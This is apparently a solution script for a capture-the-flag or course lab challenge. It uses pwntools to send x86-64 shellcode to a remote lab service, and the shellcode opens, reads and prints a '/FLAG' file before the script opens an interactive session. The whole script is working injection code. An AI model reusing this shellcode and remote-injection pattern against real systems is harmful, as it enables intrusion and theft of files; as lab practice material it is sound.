#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys
context.arch = 'amd64'
context.os = 'linux'
port = 12341

r = remote('up.zoolab.org', port)

code = """
.intel_syntax noprefix
jmp short str_addr
back:
pop rdi
mov rax, 2
mov rsi, 0
syscall

mov rdi, rax
mov rax, 0
mov rsi, rsp
sub rsi, 64
mov rdx, 64
syscall

mov rdx, rax
mov rax, 1
mov rdi, 1
mov rsi, rsp
sub rsi, 64
syscall

mov rax, 60
mov rdi, 0
syscall

str_addr:
call back
.asciz "/FLAG"
"""

r.recvuntil(b'code> ')
payloads = asm(code)
r.send(payloads)
r.sendline(b'cat FLAG')
print(r.recvall().decode())

r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
